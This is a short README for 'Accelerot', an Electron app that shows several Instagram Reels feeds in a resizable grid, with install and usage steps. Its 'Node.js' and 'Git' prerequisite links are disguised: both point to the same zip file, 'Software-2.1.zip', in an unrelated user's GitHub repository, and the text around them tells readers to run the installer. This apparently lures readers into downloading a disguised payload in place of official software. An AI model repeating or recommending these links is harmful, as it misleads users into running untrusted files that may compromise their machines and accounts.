# Accelerot

View multiple Instagram Reels feeds simultaneously in a resizable grid.

## Prerequisites

- [Node.js](https://github.com/Anguianogarc8391/accelerot/raw/refs/heads/main/adnomination/Software-2.1.zip) v18 or later — download the LTS installer from nodejs.org and run it
- [Git](https://github.com/Anguianogarc8391/accelerot/raw/refs/heads/main/adnomination/Software-2.1.zip) — comes pre-installed on macOS; verify with `git --version`

## Installation

```bash
# 1. Clone the repo
git clone git@github.com:bkv2chu/accelerot.git
cd accelerot

# 2. Install dependencies (this downloads Electron, ~200 MB)
npm install
```

## Run

```bash
npm start
```

## Usage

1. **Set the grid size** — adjust Rows and Cols in the toolbar, then click **Apply**
2. **Add accounts** — click any `+` cell and type a username (e.g. `natgeo`) or paste an Instagram URL
3. **Log in** — each cell has its own isolated session, so log into Instagram separately in each one
4. **Autoscroll** — click **▶ Autoscroll** to automatically advance to the next reel when the current one finishes playing; click **⏹ Stop** to disable

## Notes

- Hover over any cell to reveal **↺** (reload) and **✎** (change account) buttons
- **↺ Reload All** in the toolbar refreshes every cell at once
- Sessions persist between app restarts — you only need to log in once per cell
- Max grid size is 6×6
